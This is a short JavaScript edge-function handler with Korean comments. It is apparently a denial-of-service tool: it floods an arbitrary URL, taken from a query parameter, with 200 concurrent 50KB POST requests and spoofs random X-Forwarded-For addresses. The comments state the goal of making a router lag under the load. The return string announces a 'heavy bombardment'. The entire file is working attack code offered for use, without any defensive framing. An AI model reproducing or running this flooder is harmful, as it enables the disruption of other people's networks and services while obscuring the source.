export const config = { runtime: 'edge' }; export default async function handler(req) { const { searchParams } = new URL(req.url); const target = searchParams.get('target'); if (!target) return new Response("TARGET_MISSING"); // [핵심] 패킷 하나당 용량을 100배로 키웁니다 (더미 데이터 생성) // 공유기가 이 거대한 데이터를 읽다가 렉이 걸리게 만듭니다. const heavyPayload = new TextEncoder().encode("X".repeat(50000)); // 약 50KB의 묵직한 탄환 const attack = Array.from({ length: 200 }).map(() => fetch(target, { method: 'POST', // GET보다 훨씬 무거운 POST 방식 사용 body: heavyPayload, mode: 'no-cors', headers: { 'Content-Type': 'application/octet-stream', 'Cache-Control': 'no-cache', 'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.1.1` } }).catch(() => {}) ); await Promise.all(attack); return new Response("HEAVY_BOMBARDMENT_COMPLETE"); }
